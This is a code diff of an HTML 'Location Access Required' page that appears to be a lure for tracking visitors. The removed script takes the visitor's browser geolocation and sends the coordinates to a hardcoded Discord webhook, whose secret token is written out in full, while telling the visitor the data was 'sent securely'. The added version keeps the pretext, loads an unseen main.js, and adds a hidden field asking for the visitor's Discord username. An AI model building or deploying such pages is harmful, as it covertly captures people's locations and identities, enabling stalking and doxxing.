@@ -55,6 +55,15 @@
       background-color: #357ABD;
     }
 
+    input[type="text"] {
+      padding: 10px;
+      width: 80%;
+      margin-top: 20px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+    }
+
     #status {
       margin-top: 20px;
       font-size: 14px;
@@ -71,52 +80,12 @@
 
   <div class="card">
     <h2>Location Access Required</h2>
-    <p>To continue, please click the button below and allow location access.</p>
-    <button onclick="requestLocation()">Allow Location</button>
+    <p>To continue, we need your region to proceed. Allow Location</p>
+    <button onclick="startFlow()">Allow Location</button>
     <div id="status"></div>
+    <input type="text" id="discordUser" placeholder="Enter Discord username" style="display:none;" />
   </div>
 
-  <script>
-    function requestLocation() {
-      const status = document.getElementById("status");
-      status.textContent = "Requesting location...";
-
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            status.textContent = "✅ Location access granted. Continuing...";
-
-            // Send data to Discord webhook
-            fetch("https://discord.com/api/webhooks/1361350377001193543/qZvxgb0Nd6JTHusv4eGNVJm8Ooq4OQSz1p_rJkqAnUrERwOH0JlDfQ3qTmUA8xaFYhZQ", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                content: `📍 New location captured:\nLatitude: ${latitude}\nLongitude: ${longitude}\nTime: ${new Date().toLocaleString()}`
-              })
-            }).then(() => {
-              status.textContent = "✔️ Location sent securely.";
-              // Redirect or continue after sending
-              // window.location.href = "/next-page.html"; // optional
-            }).catch((err) => {
-              status.textContent = "❌ Error sending location.";
-              console.error("Webhook error:", err);
-            });
-
-          },
-          function(error) {
-            status.textContent = "❌ Failed to get location or permission denied.";
-          }
-        );
-      } else {
-        status.textContent = "🚫 Geolocation is not supported by this browser.";
-      }
-    }
-  </script>
-
+  <script src="main.js"></script>
 </body>
 </html>
